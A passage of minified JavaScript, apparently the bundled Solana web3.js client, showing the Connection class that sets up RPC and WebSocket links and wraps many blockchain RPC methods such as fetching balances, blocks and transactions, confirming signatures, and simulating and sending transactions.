(lc)}))),uf=ze(ge(se({slot:X(),transaction:yx,meta:ge(uv),blockTime:xe(ge(X())),version:xe(lc)}))),E3=tn(se({blockhash:ue(),lastValidBlockHeight:X()})),I3=tn(Ni()),S3=se({slot:X(),numTransactions:X(),numSlots:X(),samplePeriodSecs:X()}),T3=ze(pe(S3)),A3=tn(ge(se({feeCalculator:se({lamportsPerSignature:X()})}))),b3=ze(ue()),x3=ze(ue()),k3=se({err:Ta,logs:pe(ue()),signature:ue()}),C3=se({result:Lp(k3),subscription:X()}),R3={"solana-client":"js/1.0.0-maintenance"};class hv{constructor(e,t){this._commitment=void 0,this._confirmTransactionInitialTimeout=void 0,this._rpcEndpoint=void 0,this._rpcWsEndpoint=void 0,this._rpcClient=void 0,this._rpcRequest=void 0,this._rpcBatchRequest=void 0,this._rpcWebSocket=void 0,this._rpcWebSocketConnected=!1,this._rpcWebSocketHeartbeat=null,this._rpcWebSocketIdleTimeout=null,this._rpcWebSocketGeneration=0,this._disableBlockhashCaching=!1,this._pollingBlockhash=!1,this._blockhashInfo={latestBlockhash:null,lastFetch:0,transactionSignatures:[],simulatedSignatures:[]},this._nextClientSubscriptionId=0,this._subscriptionDisposeFunctionsByClientSubscriptionId={},this._subscriptionHashByClientSubscriptionId={},this._subscriptionStateChangeCallbacksByHash={},this._subscriptionCallbacksByServerSubscriptionId={},this._subscriptionsByHash={},this._subscriptionsAutoDisposedByRpc=new Set,this.getBlockHeight=(()=>{const u={};return async h=>{const{commitment:f,config:p}=St(h),w=this._buildArgs([],f,void 0,p),x=RE(w);return u[x]=u[x]??(async()=>{try{const k=await this._rpcRequest("getBlockHeight",w),I=de(k,ze(X()));if("error"in I)throw new Ie(I.error,"failed to get block height information");return I.result}finally{delete u[x]}})(),await u[x]}})();let r,i,s,o,a,l;t&&typeof t=="string"?this._commitment=t:t&&(this._commitment=t.commitment,this._confirmTransactionInitialTimeout=t.confirmTransactionInitialTimeout,r=t.wsEndpoint,i=t.httpHeaders,s=t.fetch,o=t.fetchMiddleware,a=t.disableRetryOnRateLimit,l=t.httpAgent),this._rpcEndpoint=gO(e),this._rpcWsEndpoint=r||dO(e),this._rpcClient=RO(e,i,s,o,a,l),this._rpcRequest=MO(this._rpcClient),this._rpcBatchRequest=NO(this._rpcClient),this._rpcWebSocket=new cO(this._rpcWsEndpoint,{autoconnect:!1,max_reconnects:1/0}),this._rpcWebSocket.on("open",this._wsOnOpen.bind(this)),this._rpcWebSocket.on("error",this._wsOnError.bind(this)),this._rpcWebSocket.on("close",this._wsOnClose.bind(this)),this._rpcWebSocket.on("accountNotification",this._wsOnAccountNotification.bind(this)),this._rpcWebSocket.on("programNotification",this._wsOnProgramAccountNotification.bind(this)),this._rpcWebSocket.on("slotNotification",this._wsOnSlotNotification.bind(this)),this._rpcWebSocket.on("slotsUpdatesNotification",this._wsOnSlotUpdatesNotification.bind(this)),this._rpcWebSocket.on("signatureNotification",this._wsOnSignatureNotification.bind(this)),this._rpcWebSocket.on("rootNotification",this._wsOnRootNotification.bind(this)),this._rpcWebSocket.on("logsNotification",this._wsOnLogsNotification.bind(this))}get commitment(){return this._commitment}get rpcEndpoint(){return this._rpcEndpoint}async getBalanceAndContext(e,t){const{commitment:r,config:i}=St(t),s=this._buildArgs([e.toBase58()],r,void 0,i),o=await this._rpcRequest("getBalance",s),a=de(o,tn(X()));if("error"in a)throw new Ie(a.error,`failed to get balance for ${e.toBase58()}`);return a.result}async getBalance(e,t){return await this.getBalanceAndContext(e,t).then(r=>r.value).catch(r=>{throw new Error("failed to get balance of account "+e.toBase58()+": "+r)})}async getBlockTime(e){const t=await this._rpcRequest("getBlockTime",[e]),r=de(t,ze(ge(X())));if("error"in r)throw new Ie(r.error,`failed to get block time for slot ${e}`);return r.result}async getMinimumLedgerSlot(){const e=await this._rpcRequest("minimumLedgerSlot",[]),t=de(e,ze(X()));if("error"in t)throw new Ie(t.error,"failed to get minimum ledger slot");return t.result}async getFirstAvailableBlock(){const e=await this._rpcRequest("getFirstAvailableBlock",[]),t=de(e,jO);if("error"in t)throw new Ie(t.error,"failed to get first available block");return t.result}async getSupply(e){let t={};typeof e=="string"?t={commitment:e}:e?t={...e,commitment:e&&e.commitment||this.commitment}:t={commitment:this.commitment};const r=await this._rpcRequest("getSupply",[t]),i=de(r,VO);if("error"in i)throw new Ie(i.error,"failed to get supply");return i.result}async getTokenSupply(e,t){const r=this._buildArgs([e.toBase58()],t),i=await this._rpcRequest("getTokenSupply",r),s=de(i,tn(W0));if("error"in s)throw new Ie(s.error,"failed to get token supply");return s.result}async getTokenAccountBalance(e,t){const r=this._buildArgs([e.toBase58()],t),i=await this._rpcRequest("getTokenAccountBalance",r),s=de(i,tn(W0));if("error"in s)throw new Ie(s.error,"failed to get token account balance");return s.result}async getTokenAccountsByOwner(e,t,r){const{commitment:i,config:s}=St(r);let o=[e.toBase58()];"mint"in t?o.push({mint:t.mint.toBase58()}):o.push({programId:t.programId.toBase58()});const a=this._buildArgs(o,i,"base64",s),l=await this._rpcRequest("getTokenAccountsByOwner",a),u=de(l,zO);if("error"in u)throw new Ie(u.error,`failed to get token accounts owned by account ${e.toBase58()}`);return u.result}async getParsedTokenAccountsByOwner(e,t,r){let i=[e.toBase58()];"mint"in t?i.push({mint:t.mint.toBase58()}):i.push({programId:t.programId.toBase58()});const s=this._buildArgs(i,r,"jsonParsed"),o=await this._rpcRequest("getTokenAccountsByOwner",s),a=de(o,WO);if("error"in a)throw new Ie(a.error,`failed to get token accounts owned by account ${e.toBase58()}`);return a.result}async getLargestAccounts(e){const t={...e,commitment:e&&e.commitment||this.commitment},r=t.filter||t.commitment?[t]:[],i=await this._rpcRequest("getLargestAccounts",r),s=de(i,$O);if("error"in s)throw new Ie(s.error,"failed to get largest accounts");return s.result}async getTokenLargestAccounts(e,t){const r=this._buildArgs([e.toBase58()],t),i=await this._rpcRequest("getTokenLargestAccounts",r),s=de(i,FO);if("error"in s)throw new Ie(s.error,"failed to get token largest accounts");return s.result}async getAccountInfoAndContext(e,t){const{commitment:r,config:i}=St(t),s=this._buildArgs([e.toBase58()],r,"base64",i),o=await this._rpcRequest("getAccountInfo",s),a=de(o,tn(ge($u)));if("error"in a)throw new Ie(a.error,`failed to get info about account ${e.toBase58()}`);return a.result}async getParsedAccountInfo(e,t){const{commitment:r,config:i}=St(t),s=this._buildArgs([e.toBase58()],r,"jsonParsed",i),o=await this._rpcRequest("getAccountInfo",s),a=de(o,tn(ge(H0)));if("error"in a)throw new Ie(a.error,`failed to get info about account ${e.toBase58()}`);return a.result}async getAccountInfo(e,t){try{return(await this.getAccountInfoAndContext(e,t)).value}catch(r){throw new Error("failed to get info about account "+e.toBase58()+": "+r)}}async getMultipleParsedAccounts(e,t){const{commitment:r,config:i}=St(t),s=e.map(u=>u.toBase58()),o=this._buildArgs([s],r,"jsonParsed",i),a=await this._rpcRequest("getMultipleAccounts",o),l=de(a,tn(pe(ge(H0))));if("error"in l)throw new Ie(l.error,`failed to get info for accounts ${s}`);return l.result}async getMultipleAccountsInfoAndContext(e,t){const{commitment:r,config:i}=St(t),s=e.map(u=>u.toBase58()),o=this._buildArgs([s],r,"base64",i),a=await this._rpcRequest("getMultipleAccounts",o),l=de(a,tn(pe(ge($u))));if("error"in l)throw new Ie(l.error,`failed to get info for accounts ${s}`);return l.result}async getMultipleAccountsInfo(e,t){return(await this.getMultipleAccountsInfoAndContext(e,t)).value}async getStakeActivation(e,t,r){const{commitment:i,config:s}=St(t),o=this._buildArgs([e.toBase58()],i,void 0,{...s,epoch:r??(s==null?void 0:s.epoch)}),a=await this._rpcRequest("getStakeActivation",o),l=de(a,ze(GO));if("error"in l)throw new Ie(l.error,`failed to get Stake Activation ${e.toBase58()}`);return l.result}async getProgramAccounts(e,t){const{commitment:r,config:i}=St(t),{encoding:s,...o}=i||{},a=this._buildArgs([e.toBase58()],r,s||"base64",{...o,...o.filters?{filters:PE(o.filters)}:null}),l=await this._rpcRequest("getProgramAccounts",a),u=pe(HO),h=o.withContext===!0?de(l,tn(u)):de(l,ze(u));if("error"in h)throw new Ie(h.error,`failed to get accounts owned by program ${e.toBase58()}`);return h.result}async getParsedProgramAccounts(e,t){const{commitment:r,config:i}=St(t),s=this._buildArgs([e.toBase58()],r,"jsonParsed",i),o=await this._rpcRequest("getProgramAccounts",s),a=de(o,ze(pe(KO)));if("error"in a)throw new Ie(a.error,`failed to get accounts owned by program ${e.toBase58()}`);return a.result}async confirmTransaction(e,t){var s;let r;if(typeof e=="string")r=e;else{const o=e;if((s=o.abortSignal)!=null&&s.aborted)return Promise.reject(o.abortSignal.reason);r=o.signature}let i;try{i=Bn.decode(r)}catch{throw new Error("signature must be base58 encoded: "+r)}return Bt(i.length===64,"signature has invalid length"),typeof e=="string"?await this.confirmTransactionUsingLegacyTimeoutStrategy({commitment:t||this.commitment,signature:r}):"lastValidBlockHeight"in e?await this.confirmTransactionUsingBlockHeightExceedanceStrategy({commitment:t||this.commitment,strategy:e}):await this.confirmTransactionUsingDurableNonceStrategy({commitment:t||this.commitment,strategy:e})}getCancellationPromise(e){return new Promise((t,r)=>{e!=null&&(e.aborted?r(e.reason):e.addEventListener("abort",()=>{r(e.reason)}))})}getTransactionConfirmationPromise({commitment:e,signature:t}){let r,i,s=!1;const o=new Promise((l,u)=>{try{r=this.onSignature(t,(f,p)=>{r=void 0;const w={context:p,value:f};l({__type:Ms.PROCESSED,response:w})},e);const h=new Promise(f=>{r==null?f():i=this._onSubscriptionStateChange(r,p=>{p==="subscribed"&&f()})});(async()=>{if(await h,s)return;const f=await this.getSignatureStatus(t);if(s||f==null)return;const{context:p,value:w}=f;if(w!=null)if(w!=null&&w.err)u(w.err);else{switch(e){case"confirmed":case"single":case"singleGossip":{if(w.confirmationStatus==="processed")return;break}case"finalized":case"max":case"root":{if(w.confirmationStatus==="processed"||w.confirmationStatus==="confirmed")return;break}case"processed":case"recent":}s=!0,l({__type:Ms.PROCESSED,response:{context:p,value:w}})}})()}catch(h){u(h)}});return{abortConfirmation:()=>{i&&(i(),i=void 0),r!=null&&(this.removeSignatureListener(r),r=void 0)},confirmationPromise:o}}async confirmTransactionUsingBlockHeightExceedanceStrategy({commitment:e,strategy:{abortSignal:t,lastValidBlockHeight:r,signature:i}}){let s=!1;const o=new Promise(f=>{const p=async()=>{try{return await this.getBlockHeight(e)}catch{return-1}};(async()=>{let w=await p();if(!s){for(;w<=r;)if(await Ha(1e3),s||(w=await p(),s))return;f({__type:Ms.BLOCKHEIGHT_EXCEEDED})}})()}),{abortConfirmation:a,confirmationPromise:l}=this.getTransactionConfirmationPromise({commitment:e,signature:i}),u=this.getCancellationPromise(t);let h;try{const f=await Promise.race([u,l,o]);if(f.__type===Ms.PROCESSED)h=f.response;else throw new ix(i)}finally{s=!0,a()}return h}async confirmTransactionUsingDurableNonceStrategy({commitment:e,strategy:{abortSignal:t,minContextSlot:r,nonceAccountPubkey:i,nonceValue:s,signature:o}}){let a=!1;const l=new Promise(w=>{let x=s,k=null;const I=async()=>{try{const{context:A,value:b}=await this.getNonceAndContext(i,{commitment:e,minContextSlot:r});return k=A.slot,b==null?void 0:b.nonce}catch{return x}};(async()=>{if(x=await I(),!a)for(;;){if(s!==x){w({__type:Ms.NONCE_INVALID,slotInWhichNonceDidAdvance:k});return}if(await Ha(2e3),a||(x=await I(),a))return}})()}),{abortConfirmation:u,confirmationPromise:h}=this.getTransactionConfirmationPromise({commitment:e,signature:o}),f=this.getCancellationPromise(t);let p;try{const w=await Promise.race([f,h,l]);if(w.__type===Ms.PROCESSED)p=w.response;else{let x;for(;;){const k=await this.getSignatureStatus(o);if(k==null)break;if(k.context.slot<(w.slotInWhichNonceDidAdvance??r)){await Ha(400);continue}x=k;break}if(x!=null&&x.value){const k=e||"finalized",{confirmationStatus:I}=x.value;switch(k){case"processed":case"recent":if(I!=="processed"&&I!=="confirmed"&&I!=="finalized")throw new Kc(o);break;case"confirmed":case"single":case"singleGossip":if(I!=="confirmed"&&I!=="finalized")throw new Kc(o);break;case"finalized":case"max":case"root":if(I!=="finalized")throw new Kc(o);break;default:}p={context:x.context,value:{err:x.value.err}}}else throw new Kc(o)}}finally{a=!0,u()}return p}async confirmTransactionUsingLegacyTimeoutStrategy({commitment:e,signature:t}){let r;const i=new Promise(l=>{let u=this._confirmTransactionInitialTimeout||6e4;switch(e){case"processed":case"recent":case"single":case"confirmed":case"singleGossip":{u=this._confirmTransactionInitialTimeout||3e4;break}}r=setTimeout(()=>l({__type:Ms.TIMED_OUT,timeoutMs:u}),u)}),{abortConfirmation:s,confirmationPromise:o}=this.getTransactionConfirmationPromise({commitment:e,signature:t});let a;try{const l=await Promise.race([o,i]);if(l.__type===Ms.PROCESSED)a=l.response;else throw new sx(t,l.timeoutMs/1e3)}finally{clearTimeout(r),s()}return a}async getClusterNodes(){const e=await this._rpcRequest("getClusterNodes",[]),t=de(e,ze(pe(o3)));if("error"in t)throw new Ie(t.error,"failed to get cluster nodes");return t.result}async getVoteAccounts(e){const t=this._buildArgs([],e),r=await this._rpcRequest("getVoteAccounts",t),i=de(r,a3);if("error"in i)throw new Ie(i.error,"failed to get vote accounts");return i.result}async getSlot(e){const{commitment:t,config:r}=St(e),i=this._buildArgs([],t,void 0,r),s=await this._rpcRequest("getSlot",i),o=de(s,ze(X()));if("error"in o)throw new Ie(o.error,"failed to get slot");return o.result}async getSlotLeader(e){const{commitment:t,config:r}=St(e),i=this._buildArgs([],t,void 0,r),s=await this._rpcRequest("getSlotLeader",i),o=de(s,ze(ue()));if("error"in o)throw new Ie(o.error,"failed to get slot leader");return o.result}async getSlotLeaders(e,t){const r=[e,t],i=await this._rpcRequest("getSlotLeaders",r),s=de(i,ze(pe(Gt)));if("error"in s)throw new Ie(s.error,"failed to get slot leaders");return s.result}async getSignatureStatus(e,t){const{context:r,value:i}=await this.getSignatureStatuses([e],t);Bt(i.length===1);const s=i[0];return{context:r,value:s}}async getSignatureStatuses(e,t){const r=[e];t&&r.push(t);const i=await this._rpcRequest("getSignatureStatuses",r),s=de(i,u3);if("error"in s)throw new Ie(s.error,"failed to get signature status");return s.result}async getTransactionCount(e){const{commitment:t,config:r}=St(e),i=this._buildArgs([],t,void 0,r),s=await this._rpcRequest("getTransactionCount",i),o=de(s,ze(X()));if("error"in o)throw new Ie(o.error,"failed to get transaction count");return o.result}async getTotalSupply(e){return(await this.getSupply({commitment:e,excludeNonCirculatingAccountsList:!0})).value.total}async getInflationGovernor(e){const t=this._buildArgs([],e),r=await this._rpcRequest("getInflationGovernor",t),i=de(r,PO);if("error"in i)throw new Ie(i.error,"failed to get inflation");return i.result}async getInflationReward(e,t,r){const{commitment:i,config:s}=St(r),o=this._buildArgs([e.map(u=>u.toBase58())],i,void 0,{...s,epoch:t??(s==null?void 0:s.epoch)}),a=await this._rpcRequest("getInflationReward",o),l=de(a,wO);if("error"in l)throw new Ie(l.error,"failed to get inflation reward");return l.result}async getInflationRate(){const e=await this._rpcRequest("getInflationRate",[]),t=de(e,LO);if("error"in t)throw new Ie(t.error,"failed to get inflation rate");return t.result}async getEpochInfo(e){const{commitment:t,config:r}=St(e),i=this._buildArgs([],t,void 0,r),s=await this._rpcRequest("getEpochInfo",i),o=de(s,OO);if("error"in o)throw new Ie(o.error,"failed to get epoch info");return o.result}async getEpochSchedule(){const e=await this._rpcRequest("getEpochSchedule",[]),t=de(e,BO);if("error"in t)throw new Ie(t.error,"failed to get epoch schedule");const r=t.result;return new aO(r.slotsPerEpoch,r.leaderScheduleSlotOffset,r.warmup,r.firstNormalEpoch,r.firstNormalSlot)}async getLeaderSchedule(){const e=await this._rpcRequest("getLeaderSchedule",[]),t=de(e,UO);if("error"in t)throw new Ie(t.error,"failed to get leader schedule");return t.result}async getMinimumBalanceForRentExemption(e,t){const r=this._buildArgs([e],t),i=await this._rpcRequest("getMinimumBalanceForRentExemption",r),s=de(i,h3);return"error"in s?(console.warn("Unable to fetch minimum balance for rent exemption"),0):s.result}async getRecentBlockhashAndContext(e){const{context:t,value:{blockhash:r}}=await this.getLatestBlockhashAndContext(e);return{context:t,value:{blockhash:r,feeCalculator:{get lamportsPerSignature(){throw new Error("The capability to fetch `lamportsPerSignature` using the `getRecentBlockhash` API is no longer offered by the network. Use the `getFeeForMessage` API to obtain the fee for a given message.")},toJSON(){return{}}}}}}async getRecentPerformanceSamples(e){const t=await this._rpcRequest("getRecentPerformanceSamples",e?[e]:[]),r=de(t,T3);if("error"in r)throw new Ie(r.error,"failed to get recent performance samples");return r.result}async getFeeCalculatorForBlockhash(e,t){const r=this._buildArgs([e],t),i=await this._rpcRequest("getFeeCalculatorForBlockhash",r),s=de(i,A3);if("error"in s)throw new Ie(s.error,"failed to get fee calculator");const{context:o,value:a}=s.result;return{context:o,value:a!==null?a.feeCalculator:null}}async getFeeForMessage(e,t){const r=Pn(e.serialize()).toString("base64"),i=this._buildArgs([r],t),s=await this._rpcRequest("getFeeForMessage",i),o=de(s,tn(ge(X())));if("error"in o)throw new Ie(o.error,"failed to get fee for message");if(o.result===null)throw new Error("invalid blockhash");return o.result}async getRecentPrioritizationFees(e){var o;const t=(o=e==null?void 0:e.lockedWritableAccounts)==null?void 0:o.map(a=>a.toBase58()),r=t!=null&&t.length?[t]:[],i=await this._rpcRequest("getRecentPrioritizationFees",r),s=de(i,DO);if("error"in s)throw new Ie(s.error,"failed to get recent prioritization fees");return s.result}async getRecentBlockhash(e){try{return(await this.getRecentBlockhashAndContext(e)).value}catch(t){throw new Error("failed to get recent blockhash: "+t)}}async getLatestBlockhash(e){try{return(await this.getLatestBlockhashAndContext(e)).value}catch(t){throw new Error("failed to get recent blockhash: "+t)}}async getLatestBlockhashAndContext(e){const{commitment:t,config:r}=St(e),i=this._buildArgs([],t,void 0,r),s=await this._rpcRequest("getLatestBlockhash",i),o=de(s,E3);if("error"in o)throw new Ie(o.error,"failed to get latest blockhash");return o.result}async isBlockhashValid(e,t){const{commitment:r,config:i}=St(t),s=this._buildArgs([e],r,void 0,i),o=await this._rpcRequest("isBlockhashValid",s),a=de(o,I3);if("error"in a)throw new Ie(a.error,"failed to determine if the blockhash `"+e+"`is valid");return a.result}async getVersion(){const e=await this._rpcRequest("getVersion",[]),t=de(e,ze(bO));if("error"in t)throw new Ie(t.error,"failed to get version");return t.result}async getGenesisHash(){const e=await this._rpcRequest("getGenesisHash",[]),t=de(e,ze(ue()));if("error"in t)throw new Ie(t.error,"failed to get genesis hash");return t.result}async getBlock(e,t){const{commitment:r,config:i}=St(t),s=this._buildArgsAtLeastConfirmed([e],r,void 0,i),o=await this._rpcRequest("getBlock",s);try{switch(i==null?void 0:i.transactionDetails){case"accounts":{const a=de(o,m3);if("error"in a)throw a.error;return a.result}case"none":{const a=de(o,g3);if("error"in a)throw a.error;return a.result}default:{const a=de(o,p3);if("error"in a)throw a.error;const{result:l}=a;return l?{...l,transactions:l.transactions.map(({transaction:u,meta:h,version:f})=>({meta:h,transaction:{...u,message:um(f,u.message)},version:f}))}:null}}}catch(a){throw new Ie(a,"failed to get confirmed block")}}async getParsedBlock(e,t){const{commitment:r,config:i}=St(t),s=this._buildArgsAtLeastConfirmed([e],r,"jsonParsed",i),o=await this._rpcRequest("getBlock",s);try{switch(i==null?void 0:i.transactionDetails){case"accounts":{const a=de(o,w3);if("error"in a)throw a.error;return a.result}case"none":{const a=de(o,v3);if("error"in a)throw a.error;return a.result}default:{const a=de(o,y3);if("error"in a)throw a.error;return a.result}}}catch(a){throw new Ie(a,"failed to get block")}}async getBlockProduction(e){let t,r;if(typeof e=="string")r=e;else if(e){const{commitment:a,...l}=e;r=a,t=l}const i=this._buildArgs([],r,"base64",t),s=await this._rpcRequest("getBlockProduction",i),o=de(s,CO);if("error"in o)throw new Ie(o.error,"failed to get block production information");return o.result}async getTransaction(e,t){const{commitment:r,config:i}=St(t),s=this._buildArgsAtLeastConfirmed([e],r,void 0,i),o=await this._rpcRequest("getTransaction",s),a=de(o,hm);if("error"in a)throw new Ie(a.error,"failed to get transaction");const l=a.result;return l&&{...l,transaction:{...l.transaction,message:um(l.version,l.transaction.message)}}}async getParsedTransaction(e,t){const{commitment:r,config:i}=St(t),s=this._buildArgsAtLeastConfirmed([e],r,"jsonParsed",i),o=await this._rpcRequest("getTransaction",s),a=de(o,uf);if("error"in a)throw new Ie(a.error,"failed to get transaction");return a.result}async getParsedTransactions(e,t){const{commitment:r,config:i}=St(t),s=e.map(l=>({methodName:"getTransaction",args:this._buildArgsAtLeastConfirmed([l],r,"jsonParsed",i)}));return(await this._rpcBatchRequest(s)).map(l=>{const u=de(l,uf);if("error"in u)throw new Ie(u.error,"failed to get transactions");return u.result})}async getTransactions(e,t){const{commitment:r,config:i}=St(t),s=e.map(l=>({methodName:"getTransaction",args:this._buildArgsAtLeastConfirmed([l],r,void 0,i)}));return(await this._rpcBatchRequest(s)).map(l=>{const u=de(l,hm);if("error"in u)throw new Ie(u.error,"failed to get transactions");const h=u.result;return h&&{...h,transaction:{...h.transaction,message:um(h.version,h.transaction.message)}}})}async getConfirmedBlock(e,t){const r=this._buildArgsAtLeastConfirmed([e],t),i=await this._rpcRequest("getBlock",r),s=de(i,_3);if("error"in s)throw new Ie(s.error,"failed to get confirmed block");const o=s.result;if(!o)throw new Error("Confirmed block "+e+" not found");const a={...o,transactions:o.transactions.map(({transaction:l,meta:u})=>{const h=new fs(l.message);return{meta:u,transaction:{...l,message:h}}})};return{...a,transactions:a.transactions.map(({transaction:l,meta:u})=>({meta:u,transaction:mr.populate(l.message,l.signatures)}))}}async getBlocks(e,t,r){const i=this._buildArgsAtLeastConfirmed(t!==void 0?[e,t]:[e],r),s=await this._rpcRequest("getBlocks",i),o=de(s,ze(pe(X())));if("error"in o)throw new Ie(o.error,"failed to get blocks");return o.result}async getBlockSignatures(e,t){const r=this._buildArgsAtLeastConfirmed([e],t,void 0,{transactionDetails:"signatures",rewards:!1}),i=await this._rpcRequest("getBlock",r),s=de(i,OE);if("error"in s)throw new Ie(s.error,"failed to get block");const o=s.result;if(!o)throw new Error("Block "+e+" not found");return o}async getConfirmedBlockSignatures(e,t){const r=this._buildArgsAtLeastConfirmed([e],t,void 0,{transactionDetails:"signatures",rewards:!1}),i=await this._rpcRequest("getBlock",r),s=de(i,OE);if("error"in s)throw new Ie(s.error,"failed to get confirmed block");const o=s.result;if(!o)throw new Error("Confirmed block "+e+" not found");return o}async getConfirmedTransaction(e,t){const r=this._buildArgsAtLeastConfirmed([e],t),i=await this._rpcRequest("getTransaction",r),s=de(i,hm);if("error"in s)throw new Ie(s.error,"failed to get transaction");const o=s.result;if(!o)return o;const a=new fs(o.transaction.message),l=o.transaction.signatures;return{...o,transaction:mr.populate(a,l)}}async getParsedConfirmedTransaction(e,t){const r=this._buildArgsAtLeastConfirmed([e],t,"jsonParsed"),i=await this._rpcRequest("getTransaction",r),s=de(i,uf);if("error"in s)throw new Ie(s.error,"failed to get confirmed transaction");return s.result}async getParsedConfirmedTransactions(e,t){const r=e.map(o=>({methodName:"getTransaction",args:this._buildArgsAtLeastConfirmed([o],t,"jsonParsed")}));return(await this._rpcBatchRequest(r)).map(o=>{const a=de(o,uf);if("error"in a)throw new Ie(a.error,"failed to get confirmed transactions");return a.result})}async getConfirmedSignaturesForAddress(e,t,r){let i={},s=await this.getFirstAvailableBlock();for(;!("until"in i)&&(t--,!(t<=0||t<s));)try{const l=await this.getConfirmedBlockSignatures(t,"finalized");l.signatures.length>0&&(i.until=l.signatures[l.signatures.length-1].toString())}catch(l){if(l instanceof Error&&l.message.includes("skipped"))continue;throw l}let o=await this.getSlot("finalized");for(;!("before"in i)&&(r++,!(r>o));)try{const l=await this.getConfirmedBlockSignatures(r);l.signatures.length>0&&(i.before=l.signatures[l.signatures.length-1].toString())}catch(l){if(l instanceof Error&&l.message.includes("skipped"))continue;throw l}return(await this.getConfirmedSignaturesForAddress2(e,i)).map(l=>l.signature)}async getConfirmedSignaturesForAddress2(e,t,r){const i=this._buildArgsAtLeastConfirmed([e.toBase58()],r,void 0,t),s=await this._rpcRequest("getConfirmedSignaturesForAddress2",i),o=de(s,QO);if("error"in o)throw new Ie(o.error,"failed to get confirmed signatures for address");return o.result}async getSignaturesForAddress(e,t,r){const i=this._buildArgsAtLeastConfirmed([e.toBase58()],r,void 0,t),s=await this._rpcRequest("getSignaturesForAddress",i),o=de(s,YO);if("error"in o)throw new Ie(o.error,"failed to get signatures for address");return o.result}async getAddressLookupTable(e,t){const{context:r,value:i}=await this.getAccountInfoAndContext(e,t);let s=null;return i!==null&&(s=new NE({key:e,state:NE.deserialize(i.data)})),{context:r,value:s}}async getNonceAndContext(e,t){const{context:r,value:i}=await this.getAccountInfoAndContext(e,t);let s=null;return i!==null&&(s=av.fromAccountData(i.data)),{context:r,value:s}}async getNonce(e,t){return await this.getNonceAndContext(e,t).then(r=>r.value).catch(r=>{throw new Error("failed to get nonce for account "+e.toBase58()+": "+r)})}async requestAirdrop(e,t){const r=await this._rpcRequest("requestAirdrop",[e.toBase58(),t]),i=de(r,b3);if("error"in i)throw new Ie(i.error,`airdrop to ${e.toBase58()} failed`);return i.result}async _blockhashWithExpiryBlockHeight(e){if(!e){for(;this._pollingBlockhash;)await Ha(100);const r=Date.now()-this._blockhashInfo.lastFetch>=pO;if(this._blockhashInfo.latestBlockhash!==null&&!r)return this._blockhashInfo.latestBlockhash}return await this._pollNewBlockhash()}async _pollNewBlockhash(){this._pollingBlockhash=!0;try{const e=Date.now(),t=this._blockhashInfo.latestBlockhash,r=t?t.blockhash:null;for(let i=0;i<50;i++){const s=await this.getLatestBlockhash("finalized");if(r!==s.blockhash)return this._blockhashInfo={latestBlockhash:s,lastFetch:Date.now(),transactionSignatures:[],simulatedSignatures:[]},s;await Ha(XD/2)}throw new Error(`Unable to obtain a new blockhash after ${Date.now()-e}ms`)}finally{this._pollingBlockhash=!1}}async getStakeMinimumDelegation(e){const{commitment:t,config:r}=St(e),i=this._buildArgs([],t,"base64",r),s=await this._rpcRequest("getStakeMinimumDelegation",i),o=de(s,tn(X()));if("error"in o)throw new Ie(o.error,"failed to get stake minimum delegation");return o.result}async simulateTransaction(e,t,r){if("message"in e){const k=e.serialize(),I=ve.Buffer.from(k).toString("base64");if(Array.isArray(t)||r!==void 0)throw new Error("Invalid arguments");const A=t||{};A.encoding="base64","commitment"in A||(A.commitment=this.commitment),t&&typeof t=="object"&&"innerInstructions"in t&&(A.innerInstructions=t.innerInstructions);const b=[I,A],E=await this._rpcRequest("simulateTransaction",b),O=de(E,LE);if("error"in O)throw new Error("failed to simulate transaction: "+O.error.message);return O.result}let i;if(e instanceof mr){let x=e;i=new mr,i.feePayer=x.feePayer,i.instructions=e.instructions,i.nonceInfo=x.nonceInfo,i.signatures=x.signatures}else i=mr.populate(e),i._message=i._json=void 0;if(t!==void 0&&!Array.isArray(t))throw new Error("Invalid arguments");const s=t;if(i.nonceInfo&&s)i.sign(...s);else{let x=this._disableBlockhashCaching;for(;;){const k=await this._blockhashWithExpiryBlockHeight(x);if(i.lastValidBlockHeight=k.lastValidBlockHeight,i.recentBlockhash=k.blockhash,!s)break;if(i.sign(...s),!i.signature)throw new Error("!signature");const I=i.signature.toString("base64");if(!this._blockhashInfo.simulatedSignatures.includes(I)&&!this._blockhashInfo.transactionSignatures.includes(I)){this._blockhashInfo.simulatedSignatures.push(I);break}else x=!0}}const o=i._compile(),a=o.serialize(),u=i._serialize(a).toString("base64"),h={encoding:"base64",commitment:this.commitment};if(r){const x=(Array.isArray(r)?r:o.nonProgramIds()).map(k=>k.toBase58());h.accounts={encoding:"base64",addresses:x}}s&&(h.sigVerify=!0),t&&typeof t=="object"&&"innerInstructions"in t&&(h.innerInstructions=t.innerInstructions);const f=[u,h],p=await this._rpcRequest("simulateTransaction",f),w=de(p,LE);if("error"in w){let x;if("data"in w.error&&(x=w.error.data.logs,x&&Array.isArray(x))){const k=`
    `,I=k+x.join(k);console.error(w.error.message,I)}throw new xE({action:"simulate",signature:"",transactionMessage:w.error.message,logs:x})}return w.result}async sendTransaction(e,t,r){if("version"in e){if(t&&Array.isArray(t))throw new Error("Invalid arguments");const o=e.serialize();return await this.sendRawTransaction(o,t)}if(t===void 0||!Array.isArray(t))throw new Error("Invalid arguments");const i=t;if(e.nonceInfo)e.sign(...i);else{let o=this._disableBlockhashCaching;for(;;){const a=await this._blockhashWithExpiryBlockHeight(o);if(e.lastValidBlockHeight=a.lastValidBlockHeight,e.recentBlockhash=a.blockhash,e.sign(...i),!e.signature)throw new Error("!signature");const l=e.signature.toString("base64");if(this._blockhashInfo.transactionSignatures.includes(l))o=!0;else{this._blockhashInfo.transactionSignatures.push(l);break}}}const s=e.serialize();return await this.sendRawTransaction(s,r)}async sendRawTransaction(e,t){const r=Pn(e).toString("base64");return await this.sendEncodedTransaction(r,t)}async sendEncodedTransaction(e,t){const r={encoding:"base64"},i=t&&t.skipPreflight,s=i===!0?"processed":t&&t.preflightCommitment||this.commitment;t&&t.maxRetries!=null&&(r.maxRetries=t.maxRetries),t&&t.minContextSlot!=null&&(r.minContextSlot=t.minContextSlot),i&&(r.skipPreflight=i),s&&(r.preflightCommitment=s);const o=[e,r],a=await this._rpcRequest("sendTransaction",o),l=de(a,x3);if("error"in l){let u;throw"data"in l.error&&(u=l.error.data.logs),new xE({action:i?"send":"simulate",signature:"",transactionMessage:l.error.message,logs:u})}return l.result}_wsOnOpen(){this._rpcWebSocketConnected=!0,this._rpcWebSocketHeartbeat=setInterval(()=>{(async()=>{try{await this._rpcWebSocket.notify("ping")}catch{}})()},5e3),this._updateSubscriptions()}_wsOnError(e){this._rpcWebSocketConnected=!1,console.error("ws 